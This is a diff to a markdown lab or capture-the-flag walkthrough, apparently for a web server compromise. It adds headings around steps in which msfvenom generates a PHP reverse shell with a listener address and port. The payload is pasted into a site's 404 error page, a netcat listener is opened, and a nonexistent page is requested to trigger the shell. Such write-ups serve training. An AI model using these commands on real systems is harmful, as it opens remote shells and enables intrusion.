@@ -54,13 +54,16 @@ msfvenom -p php/reverse_php LHOST=10.21.118.81 LPORT=443 -f raw > pwned.php
 ```
 ![image](https://github.com/user-attachments/assets/ac8a757b-69b4-47b9-828e-487ea520472a)
 
-
+## **the code created inside the pwned.php file will be copied into the error 404 page**
 ![image](https://github.com/user-attachments/assets/045a6510-9a06-4f5a-95e3-0fdb756f7b8b)
 
+## **we go into listening mode **
 ```bash
 nc -nlvp 443
 ```
 ![image](https://github.com/user-attachments/assets/d9fac086-7c71-4b2f-9a82-da79777f6e87)<br>
+
+## **we open a website that does not exist**
 ![image](https://github.com/user-attachments/assets/0160a91f-8439-4866-aff0-03daae79b264)
 ![image](https://github.com/user-attachments/assets/b4c10518-86b2-4d94-8bce-f5186cfe7066)
 
